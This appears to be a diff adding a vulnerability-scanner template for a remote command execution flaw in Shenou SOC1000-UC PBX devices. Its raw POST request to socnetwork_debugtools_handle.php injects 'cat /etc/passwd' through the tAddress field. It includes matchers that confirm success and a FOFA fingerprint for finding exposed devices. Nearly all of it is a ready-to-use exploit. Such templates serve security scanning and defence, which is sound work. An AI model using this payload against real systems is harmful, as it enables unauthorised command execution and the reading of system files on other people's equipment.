@@ -1,0 +1,37 @@
+id: poc-yaml-shenou-soc1000-uc-pbx-socnetwork-debugtools-handle-rce
+info:
+  name: 申瓯通信 SOC1000-UC PBX设备 socnetwork_debugtools_handle 远程代码执行漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  metadata:
+    finger: SOC1000-UC
+    fofa: body="assets/shenou/images/logo_soc1000-uc.png"
+http:
+  - raw:
+      - |
+        POST /admin/modules/socnetwork/views/socnetwork_debugtools_handle.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        tAddress=127.0.0.1;cat%20/etc/passwd&tCount=5
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "traceroute"
+          - "root:"
+          - "/bin"
+      - type: word
+        part: header
+        words:
+          - "Server: soc_httpd"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
